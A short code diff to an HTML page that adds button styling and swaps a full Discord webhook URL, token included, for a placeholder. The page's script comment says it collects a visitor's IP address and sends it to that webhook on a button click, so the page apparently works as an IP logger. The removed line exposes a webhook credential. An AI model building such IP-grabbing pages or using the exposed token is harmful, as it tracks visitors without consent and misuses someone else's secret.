@@ -32,6 +32,16 @@
     .button-container {
       margin-top: 20px;
     }
+
+    #ipButton {
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #7289da;
+      color: #ffffff;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
@@ -65,7 +75,7 @@
   <script>
     // JavaScript code to retrieve user's IP address and send it to a Discord webhook
     const ipButton = document.getElementById('ipButton');
-    const webhookUrl = 'https://discord.com/api/webhooks/1367882547408670932/ehZsUOmEPIn0S2f8ghATNlDJ_Et8rrK2WjnKmwCE2-NfU56oMFNRPkstIRXX-1Nwcfh9'; // Replace with your Discord webhook URL
+    const webhookUrl = 'https://discord.com/api/webhooks/...'; // Replace with your Discord webhook URL
 
     ipButton.addEventListener('click', async () => {
       try {
